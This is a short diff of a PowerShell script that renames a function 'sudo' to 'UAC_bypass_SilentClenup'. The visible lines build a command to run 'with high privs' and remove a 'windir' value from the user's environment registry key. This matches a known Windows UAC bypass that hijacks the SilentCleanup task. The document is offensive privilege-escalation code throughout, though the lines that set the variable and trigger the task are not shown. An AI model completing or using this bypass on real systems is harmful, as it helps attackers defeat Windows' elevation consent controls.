@@ -1,4 +1,4 @@
-function sudo {
+function UAC_bypass_SilentClenup {
 
     $command = "Desired command to run with high privs " + $args + ";#";
 	
@@ -7,4 +7,4 @@ function sudo {
     Remove-ItemProperty -Path "HKCU:\Environment" -Name "windir"
 }
 
-sudo
+UAC_bypass_SilentClenup
